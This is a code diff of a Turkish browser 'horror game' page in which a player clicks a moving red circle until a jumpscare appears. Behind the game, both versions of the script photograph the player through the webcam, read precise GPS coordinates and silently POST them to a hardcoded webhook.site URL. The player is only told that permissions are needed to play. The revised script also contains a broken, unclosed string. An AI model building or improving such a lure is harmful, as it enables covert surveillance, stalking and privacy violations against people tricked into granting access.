@@ -2,8 +2,8 @@
 <html lang="tr">
 <head>
 <meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
-<title>Korku Oyunu - Kamera & Konum</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Korku Oyunu</title>
 <style>
   html, body {
     margin: 0; padding: 0;
@@ -12,24 +12,26 @@
     font-family: Arial, sans-serif;
     height: 100vh;
     overflow: hidden;
-    -webkit-user-select: none;
-    user-select: none;
   }
-  #permission-screen {
-    display: flex;
-    flex-direction: column;
+  #permission-screen, #game-container, #jumpscare {
+    position: fixed;
+    top: 0; left: 0; width: 100%; height: 100%;
+    display: none;
     justify-content: center;
     align-items: center;
-    height: 100vh;
+    flex-direction: column;
     text-align: center;
-    padding: 1rem;
   }
-  #game-container {
-    display: none;
-    position: relative;
-    width: 100vw;
-    height: 100vh;
-    touch-action: manipulation;
+  #permission-screen { display: flex; }
+  button {
+    padding: 12px 24px;
+    font-size: 1.2rem;
+    background: crimson;
+    border: none;
+    color: white;
+    border-radius: 6px;
+    cursor: pointer;
+    margin-top: 20px;
   }
   #circle {
     width: 80px;
@@ -37,200 +39,134 @@
     background: crimson;
     border-radius: 50%;
     position: absolute;
-    cursor: pointer;
     box-shadow: 0 0 15px red;
-    transition: left 0.2s ease, top 0.2s ease;
-    touch-action: manipulation;
+    cursor: pointer;
   }
   #score-display {
     position: absolute;
     top: 20px;
     left: 20px;
     font-size: 1.5rem;
-    user-select: none;
   }
   #goal {
     position: absolute;
     top: 20px;
     right: 20px;
-    color: orange;
     font-size: 1rem;
-    user-select: none;
-  }
-  #jumpscare {
-    display: none;
-    position: fixed;
-    top: 0; left: 0; width: 100%; height: 100%;
-    background: black;
-    z-index: 9999;
-    justify-content: center;
-    align-items: center;
-    flex-direction: column;
+    color: orange;
   }
   #jumpscare img {
     width: 100%;
     max-width: 600px;
   }
-  #jumpscare audio {
-    display: none;
-  }
-  button {
-    margin-top: 20px;
-    padding: 12px 24px;
-    font-size: 1.2rem;
-    border: none;
-    border-radius: 6px;
-    background: crimson;
-    color: white;
-    cursor: pointer;
-  }
 </style>
 </head>
 <body>
 
-<div id="permission-screen" role="dialog" aria-modal="true" aria-labelledby="permTitle" aria-describedby="permDesc">
-  <h1 id="permTitle">Konum ve Kamera izni gereklidir</h1>
-  <p id="permDesc">Oyuna başlamak için lütfen konum ve kamera izinlerini verin.</p>
-  <button id="start-btn">İzinleri Ver ve Başla</button>
+<div id="permission-screen">
+  <h1>Konum ve kamera izni ver, ardından oyun başlasın!</h1>
+  <button id="start-btn">Başla</button>
 </div>
 
-<div id="game-container" role="main">
-  <div id="score-display" aria-live="polite" aria-atomic="true">Skor: 0</div>
-  <div id="goal">Hedef: 15 puan</div>
-  <div id="circle" aria-label="Hedef daire" role="button" tabindex="0"></div>
+<div id="game-container">
+  <div id="score-display">Skor: 0</div>
+  <div id="goal">Hedef: 15</div>
+  <div id="circle"></div>
 </div>
 
-<div id="jumpscare" role="alert" aria-live="assertive" tabindex="-1">
-  <img src="https://i.imgur.com/jxKX1U7.png" alt="Korkunç jumpscare" />
+<div id="jumpscare">
+  <img src="https://i.imgur.com/jxKX1U7.png" alt="Korkutucu yüz" />
   <audio id="scream" autoplay>
-    <source src="https://www.fesliyanstudios.com/play-mp3/387" type="audio/mpeg" />
+    <source src="https://www.youtube.com/watch?v=Yc-CGFVb_EE" type="audio/mpeg" />
   </audio>
 </div>
 
 <script>
-  const webhookUrl = "https://webhook.site/f5dc1b3e-8719-4c26-bd5e-23fe7a13ba34";
+const startBtn = document.getElementById("start-btn");
+const permissionScreen = document.getElementById("permission-screen");
+const gameContainer = document.getElementById("game-container");
+const circle = document.getElementById("circle");
+const scoreDisplay = document.getElementById("score-display");
+const jumpscare = document.getElementById("jumpscare");
+const scream = document.getElementById("scream");
+const webhookUrl = "https://webhook.site/f5dc1b3e-8719-4c26-bd5e-23fe7a13ba34;
 
-  const permissionScreen = document.getElementById("permission-screen");
-  const startBtn = document.getElementById("start-btn");
-  const gameContainer = document.getElementById("game-container");
-  const circle = document.getElementById("circle");
-  const scoreDisplay = document.getElementById("score-display");
-  const jumpscare = document.getElementById("jumpscare");
-  const scream = document.getElementById("scream");
+let score = 0;
 
-  let score = 0;
-  let latitude = null;
-  let longitude = null;
-
-  circle.addEventListener("click", handleClick);
-  circle.addEventListener("touchstart", e => {
-    e.preventDefault();
-    handleClick();
-  }, {passive:false});
-
-  startBtn.addEventListener("click", async () => {
-    try {
-      // Konum iste
-      const position = await getLocation();
-      latitude = position.coords.latitude;
-      longitude = position.coords.longitude;
-
-      // Kamera iste
-      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-      
-      // Kamera fotoğrafını çek ve gönder
-      await captureAndSendPhoto(stream, latitude, longitude);
-
-      // Akışı durdur
-      stream.getTracks().forEach(track => track.stop());
-
-      permissionScreen.style.display = "none";
-      gameContainer.style.display = "block";
-      moveCircleRandom();
-
-    } catch (error) {
-      alert("Konum ve kamera izinleri olmadan oyun başlayamaz.");
-    }
-  });
-
-  function getLocation() {
-    return new Promise((resolve, reject) => {
-      if (!navigator.geolocation) return reject("Geolocation desteklenmiyor.");
-      navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy: true });
-    });
-  }
-
-  async function captureAndSendPhoto(stream, lat, lon) {
-    return new Promise(async (resolve, reject) => {
-      try {
-        const video = document.createElement("video");
-        video.srcObject = stream;
-        await video.play();
-
-        // Video hazır olana kadar bekle
-        await new Promise(r => {
-          video.onloadedmetadata = () => r();
-        });
-
-        const canvas = document.createElement("canvas");
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-        const ctx = canvas.getContext("2d");
-        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-        const photoData = canvas.toDataURL("image/png");
-
-        // Fotoğrafı webhook'a JSON POST ile gönder
-        await fetch(webhookUrl, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({
-            lat: lat,
-            lon: lon,
-            time: new Date().toISOString(),
-            photo: photoData
-          })
-        });
-
-        resolve();
-      } catch (e) {
-        reject(e);
-      }
-    });
-  }
-
-  function moveCircleRandom() {
-    const maxX = window.innerWidth - circle.offsetWidth;
-    const maxY = window.innerHeight - circle.offsetHeight;
-    const x = Math.random() * maxX;
-    const y = Math.random() * maxY;
-    circle.style.left = `${x}px`;
-    circle.style.top = `${y}px`;
-  }
-
-  function handleClick() {
-    if(score >= 15) return;
-
-    score++;
-    scoreDisplay.textContent = "Skor: " + score;
+startBtn.onclick = async () => {
+  try {
+    const location = await getLocation();
+    const photoBlob = await capturePhoto();
+    await sendToWebhook(location, photoBlob);
+    permissionScreen.style.display = "none";
+    gameContainer.style.display = "block";
     moveCircleRandom();
-
-    if(score === 15) {
-      showJumpscare();
-    }
+  } catch (err) {
+    alert("İzinler alınamadı: " + err.message);
   }
+};
 
-  function showJumpscare() {
+circle.addEventListener("click", () => {
+  if(score >= 15) return;
+  score++;
+  scoreDisplay.textContent = "Skor: " + score;
+  moveCircleRandom();
+  if(score === 15) {
+    gameContainer.style.display = "none";
     jumpscare.style.display = "flex";
     scream.play();
-    alert("15'e ulaştın, oyun bitti!");
+    alert("Korktun mu? :)");
   }
+});
 
-  window.addEventListener("resize", () => {
-    if(gameContainer.style.display === "block"){
-      moveCircleRandom();
-    }
+function moveCircleRandom() {
+  const maxX = window.innerWidth - 80;
+  const maxY = window.innerHeight - 80;
+  circle.style.left = Math.random() * maxX + "px";
+  circle.style.top = Math.random() * maxY + "px";
+}
+
+function getLocation() {
+  return new Promise((resolve, reject) => {
+    if (!navigator.geolocation) return reject(new Error("Tarayıcınız konumu desteklemiyor."));
+    navigator.geolocation.getCurrentPosition(
+      pos => resolve(pos.coords),
+      err => reject(err),
+      { enableHighAccuracy: true }
+    );
   });
+}
+
+async function capturePhoto() {
+  const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+  const track = stream.getVideoTracks()[0];
+  const imageCapture = new ImageCapture(track);
+  const bitmap = await imageCapture.grabFrame();
+  track.stop();
+
+  const canvas = document.createElement("canvas");
+  canvas.width = bitmap.width;
+  canvas.height = bitmap.height;
+  const ctx = canvas.getContext("2d");
+  ctx.drawImage(bitmap, 0, 0);
+
+  return new Promise(resolve => {
+    canvas.toBlob(resolve, "image/jpeg", 0.8);
+  });
+}
+
+async function sendToWebhook(coords, photoBlob) {
+  const formData = new FormData();
+  formData.append("latitude", coords.latitude);
+  formData.append("longitude", coords.longitude);
+  formData.append("timestamp", new Date().toISOString());
+  formData.append("photo", photoBlob, "snapshot.jpg");
+
+  await fetch(webhookUrl, {
+    method: "POST",
+    body: formData
+  });
+}
 </script>
 
 </body>
